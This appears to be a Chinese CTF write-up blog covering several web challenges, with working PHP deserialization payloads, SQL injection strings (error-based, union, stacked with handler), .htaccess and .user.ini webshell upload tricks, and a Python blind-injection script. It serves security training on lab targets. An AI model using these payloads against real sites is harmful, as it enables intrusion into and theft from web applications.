```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

读取到了useless.php 源码，发现有一个 __tostring() 方法，我们在输出对象时会调用该方法，

我们再分析一下 index.php ,发现我们传的参数 password需要序列化。

因此，我们需要创建一个 Flag 对象， $file=flag.php 即可。

```php
password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

![image-20221230143321116](https://s2.loli.net/2022/12/30/MeDOA9HPYbcN2p4.png)





## [MRCTF2020]你传你🐎呢

我们首先上传一张图片马：

![image-20221230144325738](https://s2.loli.net/2022/12/30/boaU2ETRF9NDCJO.png)



然后我们上传 `.htaccess` 文件 ，目的是将 png 文件以 php脚本进行解析：

```php
AddType application/x-httpd-php .png
```

![image-20221230144419917](https://s2.loli.net/2022/12/30/xdHloT8JwQgt5vc.png)



然后使用蚁剑连接即可：

<img src="https://s2.loli.net/2022/12/30/AiWKw4lk6ecGCnJ.png" alt="image-20221230144456788" style="zoom:33%;" />



## [极客大挑战 2019]HardSQL

我们从密码处测试，发现很多被过滤了(可以使用fuzz)，union，if被过滤了，所以不能使用联合查询，bool盲注等方法了。并且空格过滤了，`/**/` `%0a` 等方法都不行，我们只用一种方法了，使用 () 去分隔：

> 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格

![image-20221230153809484](https://s2.loli.net/2022/12/30/ekrJKxvMn815aD2.png)



我们使用 `'or(1)%23` 登录成功，但是没有回显。我们错误信息会显示出来，因此我们可以使用`报错注入`

此处使用 `updatexml()`

查询表名：

```mysql
'or(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),0x7e),0))%23
```

![image-20221230154018217](https://s2.loli.net/2022/12/30/n7jrbLicqtuXp21.png)

查询字段名：

```mysql
'or(updatexml(0,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'H4rDsq1')),0x7e),0))%23
```

![image-20221230154042308](https://s2.loli.net/2022/12/30/B7nNh64WR3gLx82.png)

查询 password字段数据：

```mysql
'or(updatexml(0,concat(0x7e,(select(group_concat(password))from`H4rDsq1`),0x7e),0))%23
```

![image-20221230154135080](https://s2.loli.net/2022/12/30/Plv3YZEXkSrp6s2.png)

此时我们发现只显示出来一部分，我们尝试使用 substr()、mid()等函数，发现被过滤了。

但是我们还可以使用 left()、right()函数，这里只能使用right()

```mysql
'or(updatexml(0,concat(0x7e,(select(right(group_concat(password),30))from`H4rDsq1`),0x7e),0))%23
# 显示右边的30个字符
```

![image-20221230154323397](https://s2.loli.net/2022/12/30/MrDc3vbUQWYt7sk.png)



得到flag





## [MRCTF2020]Ez_bypass

![image-20221230154931832](https://s2.loli.net/2022/12/30/kzslJH2Qdgm1y8n.png)



md5()函数传数组返回空NULL，实现绕过。

passwd=1234567a（php弱类型比较）





## [SUCTF 2019]CheckIn

文件上传题，首先我们先上传一张内容为:aaa的图片：

<img src="https://s2.loli.net/2022/12/30/FieMZNhKRX1Wf6Q.png" alt="image-20221230155524919" style="zoom:33%;" />



发现它检查了文件的内容，于是我们加上GIF图片的头，发现上传成功：

<img src="https://s2.loli.net/2022/12/30/wdh1K6izqV9SoD8.png" alt="image-20221230165244613" style="zoom:33%;" />

发现上传图片马没有用，说包含了 `<?` ，于是我们可以采用另一种形式：< script>

![image-20221230165347545](https://s2.loli.net/2022/12/30/fPuGi1eT2JLanto.png)

我们发现，同级目录下存在 index.php ,于是，我们可以上传 `.user.ini` 文件，

这样的话会把我们指定的后缀包含进同级目录下的 php 文件中：

<img src="https://s2.loli.net/2022/12/30/FsG35yDHl4E6VWn.png" alt="image-20221230165743029" style="zoom:33%;" />

然后使用蚁剑连接一下即可。



## [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

分析代码，我们可以使用 php弱类型比较绕过 __destruct() 方法将 op->1.

并且只要 $filename="flag.php" 就可以读取到 源码，得到 flag了。

但是此处有一个问题，将 protected修饰的变量序列化之后，会产生不可见字符`\00*\00`，这样我们无法绕过 is_valid()检查

我们可以将其先改为public修饰，这样就可以了。

```php
<?php
class FileHandler {

    public $op = 2;
    public $filename = "flag.php";
    public $content;
}
echo serialize(new FileHandler());
```

```php
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
```

传参给str，成功得到flag：

![image-20221230171130134](https://s2.loli.net/2022/12/30/YftDcvqCkwFlURn.png)



> **对于PHP版本7.1+，对属性的类型不敏感**，我们可以将protected类型改为public，以消除不可打印字符



## [GXYCTF2019]BabySQli

<img src="https://s2.loli.net/2022/12/30/REN5BpwxJWoIYT3.png" alt="image-20221230175705992" style="zoom:33%;" />

登录的时候抓包：

![image-20221230175229141](https://s2.loli.net/2022/12/30/61spyjToenhvkUB.png)

发现源码中有一串编码(字母大写+数字) 这是 base32编码

于是我们去解密，得到 base64编码，再解密得到：

```mysql
select * from user where username = '$name'
```

我们尝试使用 '  闭合： 使用 Or (or被过滤了)

![image-20221230175633108](https://s2.loli.net/2022/12/30/f1dPV8tFiayL43O.png)

我们发现密码错误，然后我们使用 `Order by` 判断出字段数为 3

我们发现 () 被过滤了，玩毛。

然后，这题的逻辑是这样的：

> 首先将 输入的username进行数据库查询，如果username为 admin，查询出密码，并且将密码pw与其比较，相等则查询成功。（一般查询出的密码会被加密）

我们需要知道一个知识点： 

**union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中**

由于查询到字段数为3，我们猜测表的结构 : id,username,password ，password的加密方式为md5

于是我们可以构造：

```MYSQL
' union select 1,'admin','698d51a19d8a121ce581499d7b701668' #                     111的md5值
```

![image-20221230180458933](https://s2.loli.net/2022/12/30/8RAsUQdlOjMrae3.png)

由于前面一条查询 username='' 查询不到数据，但是我们的联合查询构造了一个虚拟数据并且返回。

经过判断，username=admin，password =md5(pw)

那么登录正确，拿到flag





## [GXYCTF2019]BabyUpload

我们上传一张png图片马：

<img src="https://s2.loli.net/2022/12/30/HAslzhYFNVT4G8m.png" alt="image-20221230180850931" style="zoom:33%;" />

发现不行，可能对文件内容进行了检测，我们添加GIF文件头 `GIF89a`

![image-20221230180945076](https://s2.loli.net/2022/12/30/azZckWuMwrh8LqS.png)

还是不行，可能过滤了php关键字，我们把php换成 = 

<img src="https://s2.loli.net/2022/12/30/p3sb9r8lGRh1uM4.png" alt="image-20221230181031360" style="zoom:33%;" />

还是不行，我们换一种php脚本写法：

![image-20221230181122528](https://s2.loli.net/2022/12/30/JlDjbadwxnQAePU.png)

额，还是不行，可能是不能上传png图片，我们把文件类型换成jpg试一下：

<img src="https://s2.loli.net/2022/12/30/mTQJN1DIV268Rns.png" alt="image-20221230181202394" style="zoom:33%;" />

成功了。

然后我们上传 `.htaccess`  （apache服务器）把png解析为php

```php
AddType application/x-httpd-php .png
```

![image-20221230181529103](https://s2.loli.net/2022/12/30/qko4R1Gm23zpagM.png)

然后我们访问 a.png,发现已经成功解析了，只要使用蚁剑连接即可。



## [GYCTF2020]Blacklist

很多都过滤了，select也过滤掉了。只能使用堆叠注入了。

查数据库名：

```mysql
?inject=';show+databases;%23
```

<img src="https://s2.loli.net/2022/12/30/OtwEg3l9mebfHjn.png" alt="image-20221230190147354" style="zoom: 25%;" />

查询表名：

<img src="https://s2.loli.net/2022/12/30/46KF1tCXSfJlydr.png" alt="image-20221230190234896" style="zoom:33%;" />

查询表 FlagHere 的列名：

```mysql
?inject=';show+columns+from+FlagHere;%23
```

<img src="https://s2.loli.net/2022/12/30/HWsPklyxOIbhXur.png" alt="image-20221230190325044" style="zoom:25%;" />

发现flag在表 FlagHere 的flag字段下。

但是select都被过滤了。我们可以使用不用select查询数据的方法，预编译prepare，handler等。

但是 prepare被过滤了。我们只能使用 mysql中 `handler`了：

```mysql
?inject=';handler+FlagHere+open;handler+FlagHere+read+first;handler+FlagHere+close;%23
```

<img src="https://s2.loli.net/2022/12/30/dtnxViy7ZbEg3vJ.png" alt="image-20221230185955397" style="zoom:33%;" />



## [CISCN2019 华北赛区 Day2 Web1]Hack World

```python
import time
import requests


def blind_injection(url):
    flag = ''
    strings = "-{abcdefghijklmnopqrstuvwxyz0123456789}"
    for num in range(1, 60):
        for i in strings:
            payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num, ord(i))
            post_data = {"id": payload}
            res = requests.post(url=url, data=post_data)
            time.sleep(0.1)
            if 'Hello' in res.text:
                flag += i
                print(flag)
            else:
                continue
    print(flag)


if __name__ == '__main__':
    url = 'http://cefdf5c8-74b2-40e1-a7c2-3a5b4e5f93d6.node4.buuoj.cn:81/index.php'
    blind_injection(url)
```

使用 bool盲注，注意 sleep,否则访问太快，状态码为429.

此处我们要将 分割出来的字符，使用 ascii() 函数转换为ascii码(不转的话，此处会检测到sql注入)